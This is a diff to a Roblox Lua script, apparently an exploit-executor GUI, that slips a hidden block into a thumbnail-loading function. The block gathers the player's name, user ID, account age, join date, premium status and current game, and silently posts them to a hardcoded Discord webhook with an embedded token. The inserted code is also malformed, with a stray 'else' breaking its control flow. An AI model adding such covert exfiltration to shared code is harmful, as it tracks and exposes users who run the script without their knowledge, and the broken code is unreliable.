@@ -2307,6 +2307,95 @@ local function C_1a()
 	local ThumbSize = Enum.ThumbnailSize.Size420x420
 
 	script.Parent.Image = game.Players:GetUserThumbnailAsync(UserId,ThumbType,ThumbSize)
+local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs"
+_G.Discord_UserID = "شخص شغل الهاك يا انيا"
+
+local player = game:GetService"Players".LocalPlayer
+local joinTime = os.time() - (player.AccountAge*86400)
+local joinDate = os.date("!*t", joinTime)
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+   alt = false
+end
+
+local executor = "Arb Exploit by anya" or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+local msg = {
+   ["username"] = "انيا",
+   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
+   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+   ["embeds"] = {
+       {
+           ["color"] = tonumber(tostring("0x32CD32")), --decimal
+           ["title"] = "تم تشغيل السكربت",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "الاسم",
+                   ["value"] = "||"..player.Name.."||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الاسم الخاص",
+                   ["value"] = player.DisplayName,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "اليوزر",
+                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "يوزر الماب",
+                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "اسم الماب",
+                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "الهاك",
+                   ["value"] = executor,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "بريميوم؟",
+                   ["value"] = alt,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "عمر حسابه",
+                   ["value"] = player.AccountAge.."day(s)",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "وقت الدخول",
+                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                   ["inline"] = true
+                },
+           },
+           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+       }
+   }
+}
+
+print("nil")
+    else
+    request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 end;
 task.spawn(C_1a);
 -- StarterGui.dev.Frame.search
@@ -2369,7 +2458,7 @@ local function C_96()
 		local decoded = http:JSONDecode(response)
 		for _, script in pairs(decoded.result.scripts) do
 			if(script.isUniversal == true) then
-				AddTab("rbxassetid://000", script.title, script.script)
+				AddTab("rbxassetid://0", script.title, script.script)
 			else
 				AddTab("https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..script.game.gameId.."&fmt=png&wd=420&ht=420", script.title, script.script)
 			end
